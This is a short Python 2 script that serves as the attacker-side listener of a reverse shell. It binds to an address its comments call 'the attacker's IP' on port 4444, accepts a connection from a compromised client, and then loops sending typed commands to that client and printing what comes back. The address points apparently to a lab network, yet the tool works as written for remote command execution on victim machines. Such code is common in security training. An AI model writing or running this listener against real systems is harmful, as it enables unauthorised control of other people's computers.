#!/usr/bin/python

import socket

listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Create a TCP socket

listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # Allow the socket to be reused

listener.bind(("10.0.2.16", 4444)) # Bind the socket to the attacker's IP and port
listener.listen(0) # Listen for incoming connections
print("Waiting for incoming connections...") # Print a message to indicate that the listener is waiting for connections
connection, address = listener.accept() # Accept an incoming connection
print("Connection established! from " + str(address)) # Print a message to indicate that a connection has been established

while True:
    command = raw_input(">> ") # Prompt the user for a command
    connection.send(command) # Send the command to the connected client
    result = connection.recv(1024) # Receive the command result from the client
    print(result) # Print the command result